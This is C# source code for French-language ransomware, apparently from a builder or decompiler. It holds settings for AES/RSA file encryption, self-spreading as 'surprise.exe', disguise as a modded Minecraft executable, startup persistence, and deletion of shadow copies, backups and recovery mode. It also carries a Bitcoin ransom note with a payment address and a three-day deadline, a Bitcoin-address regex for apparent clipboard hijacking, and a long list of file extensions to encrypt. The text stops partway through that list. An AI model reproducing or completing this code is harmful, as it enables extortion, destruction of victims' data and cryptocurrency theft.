using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "mc-javax64-modded.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = true;

	private static int sleepTextbox = 5;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "lis-moi.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[16]
	{
		"Tous vos fichiers ont étés encryptés !!!", "Votre ordinateur à été infecté par un RansomWare, ce qui signifie que tous les fichier de ton pc sont inutilisable jusqu'à ce que tu payes en BitCoin !", "", "Comment je paye, où je peut acheter des bitcoin ??", "", "Acheter des bitcoin varie selon les pays, en France tu peut aller sur :", "Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "", "Montant du payement : 0,0021 BTC (100 Eur)", "Adresse de Bitcoin (pour envoyer):  bc1qy02pc3zk0gy95404ce9lahjrfn8zmts5lmfgpp",
		"", "Une fois le payement effectué, je m'engage à décrypter les fichiers !", "", "Tu as 3 jours, sinon, Goodbye !", "", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
